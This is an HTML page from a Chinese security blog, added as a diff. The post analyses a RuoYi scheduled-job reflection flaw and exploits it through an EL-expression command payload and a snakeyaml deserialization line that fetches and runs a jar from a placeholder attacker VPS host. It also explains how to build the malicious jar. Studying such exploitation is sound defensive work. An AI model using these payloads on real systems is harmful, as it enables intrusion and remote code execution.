@@ -1,0 +1,169 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>从JNDI注入到内存马植入 | 藏青&#39;s BLOG</title>
+
+  
+  <meta name="author" content="藏青">
+  
+
+  
+  <meta name="description" content="知行合一">
+  
+
+  
+  <meta name="keywords" content="渗透 内网 代码审计">
+  
+
+  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+
+  <meta property="og:title" content="从JNDI注入到内存马植入"/>
+
+  <meta property="og:site_name" content="藏青&#39;s BLOG"/>
+
+  
+  <meta property="og:image" content="/favicon.ico"/>
+  
+
+  <link href="/favicon.ico" rel="icon">
+  <link rel="alternate" href="/atom.xml" title="藏青&#39;s BLOG" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+<div class="blog">
+  <div class="content">
+
+    <header>
+  <div class="site-branding">
+    <h1 class="site-title">
+      <a href="/">藏青&#39;s BLOG</a>
+    </h1>
+    <p class="site-description"></p>
+  </div>
+  <nav class="site-navigation">
+    <ul>
+      
+        <li><a href="/">Home</a></li>
+      
+        <li><a href="/archives">Archives</a></li>
+      
+        <li><a href="/categories">Categories</a></li>
+      
+        <li><a href="/links">Links</a></li>
+      
+    </ul>
+  </nav>
+</header>
+
+    <main class="site-main posts-loop">
+    <article>
+
+  
+    
+    <h3 class="article-title"><span>从JNDI注入到内存马植入</span></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2021/07/21/从JNDI注入到内存马植入/" rel="bookmark">
+        <time class="entry-date published" datetime="2021-07-21T01:08:05.000Z">
+          2021-07-21
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <p>​        某次团队的小伙伴给了个系统需要后台getshell，经过分析这个系统不解析jsp，但在后台发现了个反射调用任意类的任意方法的功能点，想到通过JNDI注入利用，下面着重分析如何通过JNDI注入种植内存马。</p>
+<span id="more"></span>
+
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>​        该漏洞点主要在<code>com.ruoyi.quartz.util.JobInvokeUtil#invokeMethod(com.ruoyi.quartz.domain.SysJob)</code>方法中，当传入的对象是bean,则会调用bean的方法，当传入的不是bean则创建类的实例并调用对应的方法。</p>
+<p>e</p>
+<p>​        在<code>com.ruoyi.quartz.util.JobInvokeUtil#invokeMethod(java.lang.Object, java.lang.String, java.util.List&lt;java.lang.Object[]&gt;)</code>中完成反射调用。</p>
+<p><img src="/2021/07/21/%E4%BB%8EJNDI%E6%B3%A8%E5%85%A5%E5%88%B0%E5%86%85%E5%AD%98%E9%A9%AC%E6%A4%8D%E5%85%A5/image-20210721094459758.png" alt="image-20210721094459758"></p>
+<p>​        这是一个计划任务的功能，调用目标的类参数和方法均为用户可控，所以我们可以调用任意类的非private方法。</p>
+<p><img src="/2021/07/21/%E4%BB%8EJNDI%E6%B3%A8%E5%85%A5%E5%88%B0%E5%86%85%E5%AD%98%E9%A9%AC%E6%A4%8D%E5%85%A5/image-20210721094553756.png" alt="image-20210721094553756"></p>
+<h3 id="EL表达式利用"><a href="#EL表达式利用" class="headerlink" title="EL表达式利用"></a>EL表达式利用</h3><p>​        由于这套系统依赖了tomcat环境，而tomcat自身支持el表达式，可以通过执行EL表达式进行利用。</p>
+<p><img src="/2021/07/21/%E4%BB%8EJNDI%E6%B3%A8%E5%85%A5%E5%88%B0%E5%86%85%E5%AD%98%E9%A9%AC%E6%A4%8D%E5%85%A5/image-20210721095432250.png" alt="image-20210721095432250"></p>
+<p><img src="/2021/07/21/%E4%BB%8EJNDI%E6%B3%A8%E5%85%A5%E5%88%B0%E5%86%85%E5%AD%98%E9%A9%AC%E6%A4%8D%E5%85%A5/image-20210721095453215.png" alt="image-20210721095453215"></p>
+<p>​        下面只要构造好EL表达式执行命令完成利用。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ELProcessor()).eval(<span class="string">&quot;\&quot;\&quot;.getClass().forName(\&quot;java.lang.Runtime\&quot;).getMethod(\&quot;getRuntime\&quot;).invoke(null).exec(\&quot;calc\&quot;).toString()&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>​        但是这种利用方式却出现了问题，主要是该系统对参数提取的部分导致的，在通过<code>com.ruoyi.quartz.util.JobInvokeUtil#getMethodParams</code>处理参数时，会将（）中间的内容提取当作参数，但是我们传入的参数本身就带有（）,因此只会解析到getClass(，后面传入的参数会被截断，因此无法直接通过这种方式进行利用。</p>
+<p><img src="/2021/07/21/%E4%BB%8EJNDI%E6%B3%A8%E5%85%A5%E5%88%B0%E5%86%85%E5%AD%98%E9%A9%AC%E6%A4%8D%E5%85%A5/image-20210721100749379.png" alt="image-20210721100749379"></p>
+<h3 id="snakeyaml反序列化利用"><a href="#snakeyaml反序列化利用" class="headerlink" title="snakeyaml反序列化利用"></a>snakeyaml反序列化利用</h3><p>​        这套程序使用了yml作为配置文件，而解析yml一般会使用snakeyaml库，当使用Yaml.load加载内容时，会进行反序列化操操作，将<code>!!全路径类名</code>转换为对象。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> Yaml.load(<span class="string">&#x27;!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [&quot;http://vps-ip:port/yaml-payload.jar&quot;]]]]&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>​        这里讲下为什么要加上ScriptEngineManager，我们知道当我们通过<code>URLClassLoader loader = new URLClassLoader (new URL[] &#123;u&#125;);</code>创建URLClassLoader时是不会直接去加载远程的jar的，只有当通过<code> Class.forName (&quot;Hello&quot;, true, loader);</code>时才会加载远程的Class。在ScriptEngineManager中存在构造方法并接收ClassLoader对象，并且会调用Class.forName触发类加载，所以这里才需要加上ScriptEngineManager。</p>
+<p><img src="/2021/07/21/%E4%BB%8EJNDI%E6%B3%A8%E5%85%A5%E5%88%B0%E5%86%85%E5%AD%98%E9%A9%AC%E6%A4%8D%E5%85%A5/image-20210721150351379.png" alt="image-20210721150351379"></p>
+<p>​        虽然上面的代码通过<code>Class.forName</code>触发了类加载，但是要执行我们的恶意类还取决于<code>nextName</code>的值，在<code>java.util.ServiceLoader.LazyIterator#hasNextService</code>中将pending的内容赋值给了netxtName。</p>
+<p><img src="/2021/07/21/%E4%BB%8EJNDI%E6%B3%A8%E5%85%A5%E5%88%B0%E5%86%85%E5%AD%98%E9%A9%AC%E6%A4%8D%E5%85%A5/image-20210721175458375.png" alt="image-20210721175458375"></p>
+<p>​        这里我们了解下ServiceLoader类，这个类是SPI的具体实现。在ServiceLoader.load的时候，根据传入的接口类，遍历<code>META-INF/services</code>目录下的以该类命名的文件中的所有类，并实例化返回。</p>
+<p>​        再回到代码里，我们这里传入了URLClassLoader，调用URLClassLoader.getResources会加载远程jar包的文件，再parse中读取远程<code>META-INF/services/javax.script.ScriptEngineFactory</code>中的内容并返回，所以我们的jar包中要在文件下放置我们想要获取Class实例的类名。</p>
+<p><img src="/2021/07/21/%E4%BB%8EJNDI%E6%B3%A8%E5%85%A5%E5%88%B0%E5%86%85%E5%AD%98%E9%A9%AC%E6%A4%8D%E5%85%A5/image-20210721180503290.png" alt="image-20210721180503290"></p>
+<p>​        最后提的一点是在通过Class.forName得到Class对象后，后面还会使用newInstance方法创建对象，所以我们可以把恶意代码写到构造方法中。并且通过cast将类型转换为<code>javax.script.ScriptEngineFactory</code>，所以要想执行过程中不报错，需要实现ScriptEngineFactory接口。</p>
+<p><img src="/2021/07/21/%E4%BB%8EJNDI%E6%B3%A8%E5%85%A5%E5%88%B0%E5%86%85%E5%AD%98%E9%A9%AC%E6%A4%8D%E5%85%A5/image-20210721202406778.png" alt="image-20210721202406778"></p>
+<p>​        这里需要注意编译jar的jdk版本要和目标jdk版本大致一致，我使用jdk6编译jar，在jdk8环境下运行系统加载类时会导致异常不能加载。</p>
+
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+      
+
+    <span class="post-categories">
+      <i class="icon-categories"></i>
+        <a href="/categories/漏洞利用/">漏洞利用</a>
+    </span>
+    
+
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+  
+
+
+
+
+
+
+    </main>
+
+    <footer class="site-footer">
+  <p class="site-info">
+    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
+    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
+    </br>
+    
+    &copy; 2021 藏青
+    
+  </p>
+</footer>
+    
+    
+  </div>
+</div>
+</body>
+</html>
